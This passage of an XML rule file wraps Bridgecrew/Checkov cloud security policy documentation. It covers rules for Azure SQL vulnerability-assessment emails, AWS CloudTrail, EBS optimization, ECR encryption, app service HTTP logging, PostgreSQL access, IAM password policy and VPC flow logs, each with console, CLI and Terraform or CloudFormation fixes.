      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-storage-logging-is-enabled-for-table-service-for-read-requests' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AZURE_5</key>
    <name>Ensure Azure SQL server ADS VA Also send email notifications to admins and subscription owners is enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="azure-sql-server-ads-va-also-send-email-notifications-to-admins-and-subscription-owners-is-disabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-azure-sql-server-ads-va-also-send-email-notifications-to-admins-and-subscription-owners-is-disabled"></div>Azure SQL server ADS VA <strong>Also send email notifications to admins and subscription owners</strong> is disabled</div><a aria-label="Skip link to Azure SQL server ADS VA " class="heading-anchor-icon fa fa-anchor" href="#azure-sql-server-ads-va-also-send-email-notifications-to-admins-and-subscription-owners-is-disabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Enable Vulnerability Assessment (VA) setting 'Also send email notifications to admins and subscription owners'.<br/>
VA scan reports and alerts will be sent to admins and subscription owners by enabling setting 'Also send email notifications to admins and subscription owners'. This may help in reducing time required for identifying risks and taking corrective measures.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_resource_group, azurerm_sql_server, azurerm_storage_account, azurerm_storage_container, azurerm_mssql_server_security_alert_policy, azurerm_mssql_server_vulnerability_assessment</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_resource_group" "okExample" {
  name     = "okExample-resources"
  location = "West Europe"
}

resource "azurerm_sql_server" "okExample" {
  name                         = "mysqlserver"
  resource_group_name          = azurerm_resource_group.okExample.name
  location                     = azurerm_resource_group.okExample.location
  version                      = "12.0"
  administrator_login          = "4dm1n157r470r"
  administrator_login_password = "4-v3ry-53cr37-p455w0rd"
}

resource "azurerm_storage_account" "okExample" {
  name                     = "accteststorageaccount"
  resource_group_name      = azurerm_resource_group.okExample.name
  location                 = azurerm_resource_group.okExample.location
  account_tier             = "Standard"
  account_replication_type = "GRS"
}

resource "azurerm_storage_container" "okExample" {
  name                  = "accteststoragecontainer"
  storage_account_name  = azurerm_storage_account.okExample.name
  container_access_type = "private"
}

resource "azurerm_mssql_server_security_alert_policy" "okExample" {
  resource_group_name = azurerm_resource_group.okExample.name
  server_name         = azurerm_sql_server.okExample.name
  state               = "Enabled"
}

resource "azurerm_mssql_server_vulnerability_assessment" "okExample" {
  server_security_alert_policy_id = azurerm_mssql_server_security_alert_policy.okExample.id
  storage_container_path          = "${azurerm_storage_account.okExample.primary_blob_endpoint}${azurerm_storage_container.okExample.name}/"
  storage_account_access_key      = azurerm_storage_account.okExample.primary_access_key

  recurring_scans {
    enabled                   = true
    email_subscription_admins = true
    emails = [
      "<a class="__cf_email__" data-cfemail="c8ada5a9a1a488adb0a9a5b8a4adf9e6aba7a5" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>",
      "<a class="__cf_email__" data-cfemail="b3d6ded2dadff3d6cbd2dec3dfd6819dd0dcde" href="/cdn-cgi/l/email-protection">[email&#160;protected]</a>"
    ]
  }
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-va-setting-also-send-email-notifications-to-admins-and-subscription-owners-is-set-for-an-sql-server' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-va-setting-also-send-email-notifications-to-admins-and-subscription-owners-is-set-for-an-sql-server</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-va-setting-also-send-email-notifications-to-admins-and-subscription-owners-is-set-for-an-sql-server' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_67</key>
    <name>Ensure AWS CloudTrail is enabled in all regions</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-cloudtrail-is-not-enabled-in-all-regions"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-cloud-trail-is-not-enabled-in-all-regions"></div>AWS CloudTrail is not enabled in all regions</div><a aria-label="Skip link to AWS CloudTrail is not enabled in all regions" class="heading-anchor-icon fa fa-anchor" href="#aws-cloudtrail-is-not-enabled-in-all-regions"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>AWS CloudTrail is a web service that records AWS API calls for your account and delivers log files to you. The recorded information includes: the identity of the API caller, the time of the API call, the source IP address of the API caller, the request parameters, and the response elements returned by the AWS service. CloudTrail provides a history of AWS API calls for an account, including API calls made via the Management Console, SDKs, command line tools, and higher-level AWS services such as CloudFormation. </p>
<p>The AWS API call history produced by CloudTrail enables security analysis, resource change tracking, and compliance auditing. AWS CloudTrail provides additional multi-region security:</p>
<ul>
<li>Ensuring that a multi-regions trail exists will detect unexpected activity occurring in otherwise unused regions. </li>
<li>Ensuring that a multi-regions trail exists will enable Global Service Logging for a trail by default, capturing records of events generated on AWS global services. </li>
<li>For a multi-regions trail, ensuring that management events are configured for all types of Read/Write operations, results in the recording of management actions performed on all resources in an AWS account. </li>
</ul>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To enable global (multi-region) CloudTrail logging, follow these steps:</p>
<ol>
<li>Log in to the AWS Management Console at <a href="https://console.aws.amazon.com/" target="_self">https://console.aws.amazon.com/</a>.</li>
<li>Open the <a href="https://console.aws.amazon.com/cloudtrail/" target="_self">Cloudtrail dashboard</a>.</li>
<li>On the left navigation pane, click <strong>Trails</strong>.</li>
<li>Click <strong>Get Started Now</strong>.</li>
<li>Click <strong>Add new trail </strong>.</li>
<li>Enter a trail name in the <strong>Trail name</strong> box. </li>
<li>Set <strong>Apply trail to all regions</strong> option to <strong>Yes</strong>. </li>
<li>Enter an S3 bucket name in the <strong>S3 bucket</strong> box. </li>
<li>Click <strong>Create</strong>. </li>
</ol>
<p>If one or more trail already exist, select the target trail to enable global logging, using the following steps: </p>
<ol>
<li>Next to <strong>Apply trail to all regions</strong>, click the edit icon (pencil) and select <strong>Yes</strong>.</li>
<li>Click <strong>Save</strong>.</li>
<li>Next to <strong>Management Events</strong>, click the edit icon (pencil) and select <strong>All</strong> Read/Write Events.</li>
<li>Click <strong>Save</strong>. </li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To create a multi-region trail, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-bash theme-light" data-lang="bash" name="">aws cloudtrail create-trail 
--name &lt;trail_name&gt; 
--bucket-name &lt;s3_bucket_for_cloudtrail&gt; 
--is-multi-region-trail aws cloudtrail update-trail 
--name &lt;trail_name&gt; 
--is-multi-region-trail 
</code></pre>
<blockquote class="callout callout_info" theme="&#128216;"><h3 class="callout-heading"><span class="callout-icon">&#128216;</span><p>Note</p></h3><p>Creating a CloudTrail with a CLI command, without providing any overriding options, configures Read/Write Management Events to All.</p></blockquote>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime</div><a aria-label="Skip link to Fix - Buildtime" class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource: </strong> AWS::CloudTrail::Trail</li>
<li><strong>Argument:</strong> Properties.IsMultiRegionTrail</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources: 
  MyTrail:
    Type: AWS::CloudTrail::Trail
    Properties: 
      ...
+     IsMultiRegionTrail: True
</code></pre></div></div>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime-1"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime-1"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_cloudtrail</li>
<li><strong>Argument:</strong> is_multi_region_trail - (Optional) Specifies whether the trail is created in the current region or in all regions. Defaults to false.</li>
<li></li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_cloudtrail" "foobar" {
  name                          = "tf-trail-foobar"
  s3_bucket_name                = aws_s3_bucket.foo.id
  s3_key_prefix                 = "prefix"
  include_global_service_events = false
+ is_multi_region_trail = true
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/logging_1' target='_blank'> https://docs.bridgecrew.io/docs/logging_1</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/logging_1' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_135</key>
    <name>Ensure that EC2 is EBS optimized</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="ec2-ebs-is-not-optimized"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-ec-2-ebs-is-not-optimized"></div>EC2 EBS is not optimized</div><a aria-label="Skip link to EC2 EBS is not optimized" class="heading-anchor-icon fa fa-anchor" href="#ec2-ebs-is-not-optimized"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_instance</li>
<li><strong>Argument:</strong> ebs_optimized</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_instance" "foo" {
  ...
+ ebs_optimized = true
}
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-ec2-is-ebs-optimized' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-ec2-is-ebs-optimized</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-ec2-is-ebs-optimized' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_136</key>
    <name>Ensure ECR repositories are encrypted</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="unencrypted-ecr-repositories"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-unencrypted-ecr-repositories"></div>Unencrypted ECR repositories </div><a aria-label="Skip link to Unencrypted ECR repositories " class="heading-anchor-icon fa fa-anchor" href="#unencrypted-ecr-repositories"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> aws_ecr_repository</li>
<li><strong>Argument:</strong> encryption_configuration.encryption_type</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_ecr_repository" "example" {
  ...
  name                 = "bar"
+ encryption_configuration {
+   encryption_type = "KMS"
+ }
}
</code></pre></div></div>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cloudformation"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cloud-formation"></div>CloudFormation</div><a aria-label="Skip link to CloudFormation" class="heading-anchor-icon fa fa-anchor" href="#cloudformation"></a></h2>
<ul>
<li><strong>Resource:</strong> AWS::ECR::Repository</li>
<li><strong>Argument:</strong> Properties.EncryptionConfiguration.EncryptionType</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">YAML</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-yaml theme-light" data-lang="yaml" name="">Resources:
  KMSEncryption:
    Type: AWS::ECR::Repository
    Properties: 
      ...
+     EncryptionConfiguration:
+       EncryptionType: "KMS"
        ...
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-ecr-repositories-are-encrypted' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-ecr-repositories-are-encrypted</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-ecr-repositories-are-encrypted' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AZURE_63</key>
    <name>Ensure app service enables HTTP logging</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="app-service-does-not-enable-http-logging"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-app-service-does-not-enable-http-logging"></div>App service does not enable HTTP logging</div><a aria-label="Skip link to App service does not enable HTTP logging" class="heading-anchor-icon fa fa-anchor" href="#app-service-does-not-enable-http-logging"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>TBA</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resource:</strong> azurerm_app_service</li>
<li><strong>Argument:</strong> logs.http_logs </li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "azurerm_app_service" "example" {
              name                = "example-app-service"
              location            = azurerm_resource_group.example.location
              resource_group_name = azurerm_resource_group.example.name
              app_service_plan_id = azurerm_app_service_plan.example.id
            
+             logs {
+               http_logs {
                    retention_in_days = 4
                    retention_in_mb = 10
                }
              }
            
              app_settings = {
                "SOME_KEY" = "some-value"
              }
            
              connection_string {
                name  = "Database"
                type  = "SQLServer"
                value = "Server=some-server.mydomain.com;Integrated Security=SSPI"
              }
            }
</code></pre></div></div> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-that-app-service-enables-http-logging' target='_blank'> https://docs.bridgecrew.io/docs/ensure-that-app-service-enables-http-logging</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-that-app-service-enables-http-logging' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AZURE_6</key>
    <name>Ensure 'Allow access to Azure services' for PostgreSQL Database Server is disabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="postgresql-database-server-allow-access-to-azure-services-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-postgre-sql-database-server-allow-access-to-azure-services-enabled"></div>PostgreSQL Database Server 'Allow access to Azure services' enabled </div><a aria-label="Skip link to PostgreSQL Database Server 'Allow access to Azure services' enabled " class="heading-anchor-icon fa fa-anchor" href="#postgresql-database-server-allow-access-to-azure-services-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>When 'Allow access to Azure services' settings is enabled, PostgreSQL Database server will accept connections from all Azure resources including other subscription resources as well. It is recommended to use firewall rules or VNET rules to allow access from specific network ranges or virtual networks.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime</div><a aria-label="Skip link to Fix - Runtime" class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="in-azure-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-in-azure-console"></div>In Azure Console</div><a aria-label="Skip link to In Azure Console" class="heading-anchor-icon fa fa-anchor" href="#in-azure-console"></a></h2>
<ol>
<li>Login to Azure console</li>
<li>Navigate to 'Azure Database for PostgreSQL servers' dashboard</li>
<li>Select the reported PostgreSQL server</li>
<li>Go to 'Connection security' under 'Settings'</li>
<li>Select 'No' for 'Allow access to Azure services' under 'Firewall rules'</li>
<li>Click on 'Save'</li>
</ol> <br/> <a href='https://docs.bridgecrew.io/docs/ensure-allow-access-to-azure-services-for-postgresql-database-server-is-disabled' target='_blank'> https://docs.bridgecrew.io/docs/ensure-allow-access-to-azure-services-for-postgresql-database-server-is-disabled</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/ensure-allow-access-to-azure-services-for-postgresql-database-server-is-disabled' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV_AWS_15</key>
    <name>Ensure AWS IAM password policy has an uppercase character</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-iam-password-policy-does-not-have-an-uppercase-character"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-iam-password-policy-does-not-have-an-uppercase-character"></div>AWS IAM password policy does not have an uppercase character</div><a aria-label="Skip link to AWS IAM password policy does not have an uppercase character" class="heading-anchor-icon fa fa-anchor" href="#aws-iam-password-policy-does-not-have-an-uppercase-character"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>Password policies are used to enforce the creation and use of password complexity. Your IAM password policy should be set for passwords to require the inclusion of different character types. The password policy should enforce passwords contain at least one uppercase letter, this increases security, especially from a brute force attack.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To change the password policy in the AWS Console you will need appropriate permissions to View Identity Access Management Account Settings.</p>
<p>To manually set the password policy with a minimum length, follow these steps:</p>
<ol>
<li>Log in to the AWS Management Console as an <strong>IAM user</strong> at <a href="https://console.aws.amazon.com/iam/" target="_self">https://console.aws.amazon.com/iam/</a>.</li>
<li>Navigate to <strong>IAM Services</strong>.</li>
<li>On the Left Pane click <strong>Account Settings</strong>.</li>
<li>Select <strong>Requires at least one uppercase letter</strong>. </li>
<li>Click <strong>Apply password policy</strong>.</li>
</ol>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="cli-command"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-cli-command"></div>CLI Command</div><a aria-label="Skip link to CLI Command" class="heading-anchor-icon fa fa-anchor" href="#cli-command"></a></h2>
<p>To change the password policy, use the following command:</p>
<pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-bash theme-light" data-lang="bash" name="">aws iam update-account-password-policy --require-uppercase-characters
</code></pre>
<blockquote class="callout callout_info" theme="&#128216;"><h3 class="callout-heading"><span class="callout-icon">&#128216;</span><p>Note</p></h3><p>All commands starting with <strong>aws iam update-account-password-policy</strong> can be combined into a single command.</p></blockquote> <br/> <a href='https://docs.bridgecrew.io/docs/iam_5' target='_blank'> https://docs.bridgecrew.io/docs/iam_5</a>]]>
    </description>
    <type>VULNERABILITY</type>
    <help>
      <![CDATA[<a href='https://docs.bridgecrew.io/docs/iam_5' target='_blank'> Rule Docs</a> <br/> <a href='' target='_blank'></a>]]>
    </help>
  </rule>
  <rule>
    <key>CKV2_AWS_11</key>
    <name>Ensure AWS VPC Flow logs are enabled</name>
    <description>
      <![CDATA[<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-vpc-flow-logs-not-enabled"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-vpc-flow-logs-not-enabled"></div>AWS VPC Flow logs not enabled</div><a aria-label="Skip link to AWS VPC Flow logs not enabled" class="heading-anchor-icon fa fa-anchor" href="#aws-vpc-flow-logs-not-enabled"></a></h1>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="description"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-description"></div>Description</div><a aria-label="Skip link to Description" class="heading-anchor-icon fa fa-anchor" href="#description"></a></h1>
<p>VPC Flow Logs is a feature that enables you to capture information about the IP traffic going to and from network interfaces in your VPC. After you have created a flow log, you can view and retrieve its data in Amazon CloudWatch Logs. VPC Flow Logs provide visibility into network traffic that traverses the VPC.</p>
<p>We recommend that VPC Flow Logs are enabled for packet Rejects for VPCs to help detect anomalous traffic and insight during security workflows.</p>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---runtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-runtime"></div>Fix - Runtime </div><a aria-label="Skip link to Fix - Runtime " class="heading-anchor-icon fa fa-anchor" href="#fix---runtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="aws-console"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-aws-console"></div>AWS Console</div><a aria-label="Skip link to AWS Console" class="heading-anchor-icon fa fa-anchor" href="#aws-console"></a></h2>
<p>To determine if the VPC Flow logs is enabled, follow these steps:</p>
<ol>
<li>Log in to the AWS Management Console at [https://console.aws.amazon.com/]</li>
<li>Select <strong>Services</strong>.</li>
<li>Select <strong>VPC</strong>.</li>
<li>In the left navigation pane, select <strong>Your VPCs</strong>.</li>
<li>Select a <strong>VPC</strong>.</li>
<li>In the right pane, select the <strong>Flow Logs</strong> tab.</li>
<li>If no Flow Log exists, click <strong>Create Flow Log</strong>.</li>
<li>Set <strong>Filter</strong> to <strong>Reject</strong>.</li>
<li>Enter a <strong>Role</strong> and <strong>Destination Log Group</strong>.</li>
<li>Click <strong>Create Log Flow</strong>.</li>
<li>Click <strong>CloudWatch Logs Group</strong>.</li>
</ol>
<h1 align="" class="heading heading-1 header-scroll"><div class="heading-anchor anchor waypoint" id="fix---buildtime"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-fix-buildtime"></div>Fix - Buildtime </div><a aria-label="Skip link to Fix - Buildtime " class="heading-anchor-icon fa fa-anchor" href="#fix---buildtime"></a></h1>
<h2 align="" class="heading heading-2 header-scroll"><div class="heading-anchor anchor waypoint" id="terraform"></div><div class="heading-text"><div class="heading-anchor_backwardsCompatibility" id="section-terraform"></div>Terraform</div><a aria-label="Skip link to Terraform" class="heading-anchor-icon fa fa-anchor" href="#terraform"></a></h2>
<ul>
<li><strong>Resources:</strong> aws_flow_log + aws_vpc</li>
<li><strong>Argument:</strong> vpc_id (of aws_flow_log)</li>
</ul>
<div class="CodeTabs CodeTabs_initial theme-light"><div class="CodeTabs-toolbar"><button type="button">Go</button></div><div class="CodeTabs-inner"><pre><button aria-label="Copy Code" class="rdmd-code-copy fa"></button><code class="rdmd-code lang-go theme-light" data-lang="go" name="">resource "aws_flow_log" "example" {
